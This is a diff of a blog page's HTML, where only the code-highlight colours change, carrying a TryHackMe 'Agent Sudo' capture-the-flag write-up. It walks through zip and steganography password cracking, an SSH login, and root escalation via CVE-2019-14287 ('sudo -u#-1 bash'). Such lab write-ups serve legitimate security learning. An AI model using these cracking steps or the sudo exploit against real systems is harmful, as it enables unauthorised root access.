 </span></span><span style="display:flex;"><span>└─$ ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">365</span>  365.zlib  4john  8702.zip  To_agentR.txt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">365</span>  365.zlib  4john  8702.zip  To_agentR.txt
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ john 4john
 </span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
-</span></span><span style="display:flex;"><span>Loaded <span style="color:#1c01ce">1</span> password <span style="color:#a90d91">hash</span> <span style="color:#000">(</span>ZIP, WinZip <span style="color:#000">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span style="color:#000">])</span>
-</span></span><span style="display:flex;"><span>Cost <span style="color:#1c01ce">1</span> <span style="color:#000">(</span>HMAC size<span style="color:#000">)</span> is <span style="color:#1c01ce">78</span> <span style="color:#a90d91">for</span> all loaded hashes
-</span></span><span style="display:flex;"><span>Will run <span style="color:#1c01ce">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>ZIP, WinZip <span style="color:#ff79c6">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span style="color:#ff79c6">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>HMAC size<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">78</span> <span style="color:#ff79c6">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#bd93f9">4</span> OpenMP threads
 </span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
-</span></span><span style="display:flex;"><span>Press <span style="color:#c41a16">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#a90d91">for</span> status
-</span></span><span style="display:flex;"><span>Almost <span style="color:#a90d91">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#a90d91">if</span> any.
+</span></span><span style="display:flex;"><span>Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
+</span></span><span style="display:flex;"><span>Almost <span style="color:#ff79c6">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#ff79c6">if</span> any.
 </span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
-</span></span><span style="display:flex;"><span>----n            <span style="color:#000">(</span>8702.zip/To_agentR.txt<span style="color:#000">)</span>     
-</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE 2/3 <span style="color:#000">(</span>2022-05-23 11:42<span style="color:#000">)</span> 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
-</span></span><span style="display:flex;"><span>Use the <span style="color:#c41a16">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>----n            <span style="color:#ff79c6">(</span>8702.zip/To_agentR.txt<span style="color:#ff79c6">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE 2/3 <span style="color:#ff79c6">(</span>2022-05-23 11:42<span style="color:#ff79c6">)</span> 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
+</span></span><span style="display:flex;"><span>Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </span></span><span style="display:flex;"><span>Session completed. 
 </span></span></code></pre></div><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Agent C,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Agent C,
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>We need to send the picture to &#39;-------x&#39; as soon as possible!
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>By,
 </span></span><span style="display:flex;"><span>Agent R
 </span></span></code></pre></div><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ touch -------x.txt
 </span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ vim -------x.txt
 </span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ base64 -d <span style="color:#c41a16">&#39;-------x.txt&#39;</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>└─$ base64 -d <span style="color:#f1fa8c">&#39;-------x.txt&#39;</span>
 </span></span><span style="display:flex;"><span>-----1   
 </span></span></code></pre></div><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
 <p>The next prompt on THM asks for the <code>steg password</code>. I don&rsquo;t know what that is, so I search for it and <a href="https://www.kali.org/tools/stegcracker/">stegcracker</a> tops the list. Let&rsquo;s try it, in conjunction with our remaining alien image <code>cute-alien.jpg</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ stegcracker cute-alien.jpg
-</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#000">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> - Luke Paris <span style="color:#000">(</span>Paradoxis<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#ff79c6">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2022</span> - Luke Paris <span style="color:#ff79c6">(</span>Paradoxis<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>StegCracker has been retired following the release of StegSeek, which 
-</span></span><span style="display:flex;"><span><span style="color:#c41a16">&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">StegSeek can be found at: https://github.com/RickdeJager/stegseek
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">No wordlist was specified, using default rockyou.txt wordlist.
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">Counting lines in wordlist..
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">StegSeek can be found at: https://github.com/RickdeJager/stegseek
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">No wordlist was specified, using default rockyou.txt wordlist.
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Counting lines in wordlist..
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
 </span></span></span></code></pre></div><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
 <p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>                                                         
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ steghide --extract -sf cute-alien.jpg
 </span></span><span style="display:flex;"><span>Enter passphrase: 
-</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#c41a16">&#34;message.txt&#34;</span>.
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#f1fa8c">&#34;message.txt&#34;</span>.
 </span></span><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat message.txt
 </span></span><span style="display:flex;"><span>Hi ----s,
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Glad you find this message. Your login password is hackerrules!
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Don<span style="color:#000">&#39;</span>t ask me why the password look cheesy, ask agent R who <span style="color:#a90d91">set</span> this password <span style="color:#a90d91">for</span> you.
+</span></span><span style="display:flex;"><span>Don&#39;t ask me why the password look cheesy, ask agent R who <span style="color:#8be9fd;font-style:italic">set</span> this password <span style="color:#ff79c6">for</span> you.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Your buddy,
 </span></span><span style="display:flex;"><span>----s
 </span></span></code></pre></div><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ stegcracker cute-alien.jpg
-</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#000">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> - Luke Paris <span style="color:#000">(</span>Paradoxis<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#ff79c6">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2022</span> - Luke Paris <span style="color:#ff79c6">(</span>Paradoxis<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>StegCracker has been retired following the release of StegSeek, which 
 </span></span><span style="display:flex;"><span>will blast through the rockyou.txt wordlist within 1.9 second as opposed 
@@ -317,78 +317,78 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>No wordlist was specified, using default rockyou.txt wordlist.
 </span></span><span style="display:flex;"><span>Counting lines in wordlist..
-</span></span><span style="display:flex;"><span>Attacking file <span style="color:#c41a16">&#39;cute-alien.jpg&#39;</span> with wordlist <span style="color:#c41a16">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>..
+</span></span><span style="display:flex;"><span>Attacking file <span style="color:#f1fa8c">&#39;cute-alien.jpg&#39;</span> with wordlist <span style="color:#f1fa8c">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>..
 </span></span><span style="display:flex;"><span>Successfully cracked file with password: -----1doro1111
-</span></span><span style="display:flex;"><span>Tried <span style="color:#1c01ce">441203</span> passwords
+</span></span><span style="display:flex;"><span>Tried <span style="color:#bd93f9">441203</span> passwords
 </span></span><span style="display:flex;"><span>Your file has been written to: cute-alien.jpg.out
 </span></span><span style="display:flex;"><span>-----1
 </span></span><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat cute-alien.jpg.out
 </span></span><span style="display:flex;"><span>Hi ----s,
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Glad you find this message. Your login password is hackerrules!
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Don<span style="color:#000">&#39;</span>t ask me why the password look cheesy, ask agent R who <span style="color:#a90d91">set</span> this password <span style="color:#a90d91">for</span> you.
+</span></span><span style="display:flex;"><span>Don&#39;t ask me why the password look cheesy, ask agent R who <span style="color:#8be9fd;font-style:italic">set</span> this password <span style="color:#ff79c6">for</span> you.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Your buddy,
 </span></span><span style="display:flex;"><span>----s    
 </span></span></code></pre></div><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ ssh ----s@10.10.108.206
-</span></span><span style="display:flex;"><span>----s@10.10.108.206<span style="color:#000">&#39;</span>s password: 
-</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.3 LTS <span style="color:#000">(</span>GNU/Linux 4.15.0-55-generic x86_64<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>----s@10.10.108.206&#39;s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.3 LTS <span style="color:#ff79c6">(</span>GNU/Linux 4.15.0-55-generic x86_64<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
 </span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
 </span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  System information as of Mon May <span style="color:#1c01ce">23</span> 16:28:05 UTC <span style="color:#1c01ce">2022</span>
+</span></span><span style="display:flex;"><span>  System information as of Mon May <span style="color:#bd93f9">23</span> 16:28:05 UTC <span style="color:#bd93f9">2022</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  System load:  1.07              Processes:           <span style="color:#1c01ce">99</span>
-</span></span><span style="display:flex;"><span>  Usage of /:   39.8% of 9.78GB   Users logged in:     <span style="color:#1c01ce">0</span>
-</span></span><span style="display:flex;"><span>  Memory usage: 19%               IP address <span style="color:#a90d91">for</span> eth0: 10.10.108.206
+</span></span><span style="display:flex;"><span>  System load:  1.07              Processes:           <span style="color:#bd93f9">99</span>
+</span></span><span style="display:flex;"><span>  Usage of /:   39.8% of 9.78GB   Users logged in:     <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>  Memory usage: 19%               IP address <span style="color:#ff79c6">for</span> eth0: 10.10.108.206
 </span></span><span style="display:flex;"><span>  Swap usage:   0%
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">75</span> packages can be updated.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">33</span> updates are security updates.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">75</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">33</span> updates are security updates.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Last login: Tue Oct <span style="color:#1c01ce">29</span> 14:26:27 <span style="color:#1c01ce">2019</span>
+</span></span><span style="display:flex;"><span>Last login: Tue Oct <span style="color:#bd93f9">29</span> 14:26:27 <span style="color:#bd93f9">2019</span>
 </span></span><span style="display:flex;"><span>----s@agent-sudo:~$ ls
 </span></span><span style="display:flex;"><span>Alien_autospy.jpg  user_flag.txt
 </span></span><span style="display:flex;"><span>----s@agent-sudo:~$ cat user_flag.txt
-</span></span><span style="display:flex;"><span>🎌<span style="color:#c41a16">`</span>user flag<span style="color:#c41a16">`</span>🎌
+</span></span><span style="display:flex;"><span>🎌<span style="color:#f1fa8c">`</span>user flag<span style="color:#f1fa8c">`</span>🎌
 </span></span><span style="display:flex;"><span>----s@agent-sudo:~$ 
 </span></span></code></pre></div><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
 <p>Now let&rsquo;s try to get root. First, I check to see what our friend <code>----s</code> has <code>sudo</code> permissions to run:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -l
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>sudo<span style="color:#000">]</span> password <span style="color:#a90d91">for</span> ----s: 
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#a90d91">for</span> ----s on agent-sudo:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> ----s: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> ----s on agent-sudo:
 </span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
-</span></span><span style="display:flex;"><span>    <span style="color:#000">secure_path</span><span style="color:#000">=</span>/usr/local/sbin<span style="color:#c41a16">\:</span>/usr/local/bin<span style="color:#c41a16">\:</span>/usr/sbin<span style="color:#c41a16">\:</span>/usr/bin<span style="color:#c41a16">\:</span>/sbin<span style="color:#c41a16">\:</span>/bin<span style="color:#c41a16">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User ----s may run the following commands on agent-sudo:
-</span></span><span style="display:flex;"><span>    <span style="color:#000">(</span>ALL, !root<span style="color:#000">)</span> /bin/bash
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>ALL, !root<span style="color:#ff79c6">)</span> /bin/bash
 </span></span></code></pre></div><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#-1 bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#-1 bash
 </span></span><span style="display:flex;"><span>root@agent-sudo:~# whoami
 </span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#4294967295 bash
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>sudo<span style="color:#000">]</span> password <span style="color:#a90d91">for</span> ----s: 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#4294967295 bash
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> ----s: 
 </span></span><span style="display:flex;"><span>root@agent-sudo:~# whoami
 </span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div><p>Pretty crazy!</p>
 <p>Now for the final spy message of the box:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@agent-sudo:/# <span style="color:#a90d91">cd</span> /root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@agent-sudo:/# <span style="color:#8be9fd;font-style:italic">cd</span> /root
 </span></span><span style="display:flex;"><span>root@agent-sudo:/root# ls
 </span></span><span style="display:flex;"><span>root.txt
 </span></span><span style="display:flex;"><span>root@agent-sudo:/root# cat root.txt
 </span></span><span style="display:flex;"><span>To Mr.hacker,
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Congratulation on rooting this box. This box was designed <span style="color:#a90d91">for</span> TryHackMe. Tips, always update your machine. 
+</span></span><span style="display:flex;"><span>Congratulation on rooting this box. This box was designed <span style="color:#ff79c6">for</span> TryHackMe. Tips, always update your machine. 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Your flag is 
 </span></span><span style="display:flex;"><span>🎌root flag🎌
@@ -415,31 +415,31 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 <p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
 <h2 id="methodology">Methodology</h2>
 <p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I usually begin with the TCP SYN &ldquo;Stealth&rdquo; Scan (-sS) with &ldquo;version dection&rdquo; (<code>-V</code>) enabled. Here is a <a href="https://nmap.org/book/port-scanning-options.html">list of general <code>nmap</code> CLI flags</a>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap sudo nmap -sV -v &lt;target-ip&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap sudo nmap -sV -v &lt;target-ip&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#000">(</span> https://nmap.org <span style="color:#000">)</span> at 2022-05-10 12:12 EDT
-</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#1c01ce">45</span> scripts <span style="color:#a90d91">for</span> scanning.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2022-05-10 12:12 EDT
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#bd93f9">45</span> scripts <span style="color:#ff79c6">for</span> scanning.
 </span></span><span style="display:flex;"><span>Initiating Ping Scan at 12:12
-</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#000">[</span><span style="color:#1c01ce">4</span> ports<span style="color:#000">]</span>
